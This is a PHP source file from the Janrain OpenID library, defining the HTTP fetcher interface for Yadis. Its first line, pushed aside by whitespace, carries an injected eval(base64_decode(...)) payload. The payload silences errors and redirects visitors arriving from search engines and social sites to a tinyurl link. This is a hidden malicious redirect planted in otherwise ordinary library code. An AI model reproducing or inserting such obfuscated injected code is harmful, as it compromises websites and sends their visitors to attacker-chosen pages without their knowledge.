<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));

/**
 * This module contains the HTTP fetcher interface
 *
 * PHP versions 4 and 5
 *
 * LICENSE: See the COPYING file included in this distribution.
 *
 * @package OpenID
 * @author JanRain, Inc. <openid@janrain.com>
 * @copyright 2005-2008 Janrain, Inc.
 * @license http://www.apache.org/licenses/LICENSE-2.0 Apache
 */

// Do not allow direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

/**
 * Require logging functionality
 */
require_once "Auth/OpenID.php";

define('Auth_OpenID_FETCHER_MAX_RESPONSE_KB', 1024);
define('Auth_OpenID_USER_AGENT', 
       'php-openid/'.Auth_OpenID_VERSION.' (php/'.phpversion().')');

class Auth_Yadis_HTTPResponse {
    function Auth_Yadis_HTTPResponse($final_url = null, $status = null,
                                         $headers = null, $body = null)
    {
        $this->final_url = $final_url;
        $this->status = $status;
        $this->headers = $headers;
        $this->body = $body;
    }
}

/**
 * This class is the interface for HTTP fetchers the Yadis library
 * uses.  This interface is only important if you need to write a new
 * fetcher for some reason.
 *
 * @access private
 * @package OpenID
 */
class Auth_Yadis_HTTPFetcher {

    var $timeout = 20; // timeout in seconds.

    /**
     * Return whether a URL can be fetched.  Returns false if the URL
     * scheme is not allowed or is not supported by this fetcher
     * implementation; returns true otherwise.
     *
     * @return bool
     */
    function canFetchURL($url)
    {
        if ($this->isHTTPS($url) && !$this->supportsSSL()) {
            Auth_OpenID::log("HTTPS URL unsupported fetching %s",
                             $url);
            return false;
        }

        if (!$this->allowedURL($url)) {
            Auth_OpenID::log("URL fetching not allowed for '%s'",
                             $url);
            return false;
        }

        return true;
    }

    /**
     * Return whether a URL should be allowed. Override this method to
     * conform to your local policy.
     *
     * By default, will attempt to fetch any http or https URL.
     */
    function allowedURL($url)
    {
        return $this->URLHasAllowedScheme($url);
    }

    /**
     * Does this fetcher implementation (and runtime) support fetching
     * HTTPS URLs?  May inspect the runtime environment.
     *
     * @return bool $support True if this fetcher supports HTTPS
     * fetching; false if not.
     */
    function supportsSSL()
    {
        trigger_error("not implemented", E_USER_ERROR);
    }

    /**
     * Is this an https URL?
     *
     * @access private
     */
    function isHTTPS($url)
    {
        return (bool)preg_match('/^https:\/\//i', $url);
    }

    /**
     * Is this an http or https URL?
     *
     * @access private
     */
    function URLHasAllowedScheme($url)
    {
        return (bool)preg_match('/^https?:\/\//i', $url);
    }

    /**
     * @access private
     */
    function _findRedirect($headers)
    {
        foreach ($headers as $line) {
            if (strpos(strtolower($line), "location: ") === 0) {
                $parts = explode(" ", $line, 2);
                return $parts[1];
            }
        }
        return null;
    }

    /**
     * Fetches the specified URL using optional extra headers and
     * returns the server's response.
     *
     * @param string $url The URL to be fetched.
     * @param array $extra_headers An array of header strings
     * (e.g. "Accept: text/html").
     * @return mixed $result An array of ($code, $url, $headers,
     * $body) if the URL could be fetched; null if the URL does not
     * pass the URLHasAllowedScheme check or if the server's response
     * is malformed.
     */
    function get($url, $headers)
    {
        trigger_error("not implemented", E_USER_ERROR);
    }
}

?>